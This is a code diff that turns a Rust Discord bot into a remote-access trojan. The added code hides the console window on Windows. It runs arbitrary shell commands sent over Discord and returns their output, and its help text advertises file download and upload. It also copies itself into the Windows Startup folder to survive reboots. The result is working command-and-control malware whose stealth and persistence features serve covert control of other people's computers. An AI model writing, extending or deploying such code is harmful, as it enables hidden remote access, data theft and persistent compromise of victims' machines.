@@ -1,4 +1,5 @@
-use std::env;
+// Disable console window on Windows
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
 use serenity::all::GatewayIntents;
 use serenity::async_trait;
@@ -6,30 +7,78 @@ use serenity::builder::{CreateAttachment, CreateMessage};
 use serenity::model::channel::Message;
 use serenity::model::gateway::Ready;
 use serenity::prelude::*;
+use std::env;
 use std::path::Path;
+use std::process::Stdio;
 use tokio::process::Command;
 
 struct Handler;
 
+#[cfg(windows)]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
 #[async_trait]
 impl EventHandler for Handler {
-    // Set a handler for the `message` event. This is called whenever a new message is received.
-    //
-    // Event handlers are dispatched through a threadpool, and so multiple events can be
-    // dispatched simultaneously.
     async fn message(&self, ctx: Context, msg: Message) {
         if msg.content == "!ping" {
-            // Sending a message can fail, due to a network error, an authentication error, or lack
-            // of permissions to post in the channel, so log to stdout when some error happens,
-            // with a description of it.
             if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
+                println!("Error sending message: {why:?}");
+            }
+        }
+        if msg.content == "!help" {
+            let help_text = "```Available commands:
+!ping                - Responds with 'Pong'
+!help                - Shows help section
+!run <command>       - Executes a shell command
+!cd <directory>      - Changes the current directory
+!ls                  - Lists files and directories
+!download <file>     - Downloads the specified file
+!upload (attachment) - Uploads the attached file```";
+
+            if let Err(why) = msg.channel_id.say(&ctx.http, help_text).await {
                 println!("Error sending message: {why:?}");
             }
         }
         if msg.content.starts_with("!run ") {
             let command = msg.content.strip_prefix("!run ").unwrap_or("");
-            if let Err(why) = Command::new("sh").arg("-c").arg(command).spawn() {
-                println!("Error executing command: {why:?}");
+            let output = {
+                #[cfg(windows)]
+                {
+                    Command::new("cmd")
+                        .arg("/C")
+                        .arg(command)
+                        .stdin(Stdio::null())
+                        .stdout(Stdio::piped())
+                        .stderr(Stdio::piped())
+                        .creation_flags(CREATE_NO_WINDOW)
+                        .output()
+                        .await
+                }
+                #[cfg(unix)]
+                {
+                    Command::new("sh")
+                        .arg("-c")
+                        .arg(command)
+                        .stdin(Stdio::null())
+                        .stdout(Stdio::piped())
+                        .stderr(Stdio::piped())
+                        .output()
+                        .await
+                }
+            };
+
+            if let Ok(output) = output {
+                let stdout = String::from_utf8_lossy(&output.stdout);
+                let stderr = String::from_utf8_lossy(&output.stderr);
+                let response = if !stdout.is_empty() {
+                    stdout.to_string()
+                } else if !stderr.is_empty() {
+                    stderr.to_string()
+                } else {
+                    "Command executed, but no output.".to_string()
+                };
+
+                let _ = msg.channel_id.say(&ctx.http, response).await;
             }
         }
         if msg.content.starts_with("!cd ") {
@@ -127,36 +176,46 @@ impl EventHandler for Handler {
         }
     }
 
-    // Set a handler to be called on the `ready` event. This is called when a shard is booted, and
-    // a READY payload is sent by Discord. This payload contains data like the current user's guild
-    // Ids, current user data, private channels, and more.
-    //
-    // In this case, just print what the current user's username is.
     async fn ready(&self, _: Context, ready: Ready) {
         println!("{} is connected!", ready.user.name);
     }
 }
 
+#[cfg(target_os = "windows")]
+async fn copy_to_startup() {
+    use std::env;
+    use std::fs;
+
+    if let Ok(exe_path) = env::current_exe() {
+        if let Some(exe_name) = exe_path.file_name() {
+            let startup_path = format!(
+                "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}",
+                env::var("APPDATA").unwrap(),
+                exe_name.to_string_lossy()
+            );
+
+            let _ = fs::remove_file(&startup_path);
+            let _ = fs::copy(&exe_path, &startup_path);
+        }
+    }
+}
+
 #[tokio::main]
 async fn main() {
-    // Configure the client with your Discord bot token in the environment.
+    #[cfg(target_os = "windows")]
+    copy_to_startup().await;
+
     let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");
-    // Set gateway intents, which decides what events the bot will be notified about
+
     let intents = GatewayIntents::GUILD_MESSAGES
         | GatewayIntents::DIRECT_MESSAGES
         | GatewayIntents::MESSAGE_CONTENT;
 
-    // Create a new instance of the Client, logging in as a bot. This will automatically prepend
-    // your bot token with "Bot ", which is a requirement by Discord for bot users.
     let mut client = Client::builder(&token, intents)
         .event_handler(Handler)
         .await
         .expect("Err creating client");
 
-    // Finally, start a single shard, and start listening to events.
-    //
-    // Shards will automatically attempt to reconnect, and will perform exponential backoff until
-    // it reconnects.
     if let Err(why) = client.start().await {
         println!("Client error: {why:?}");
     }
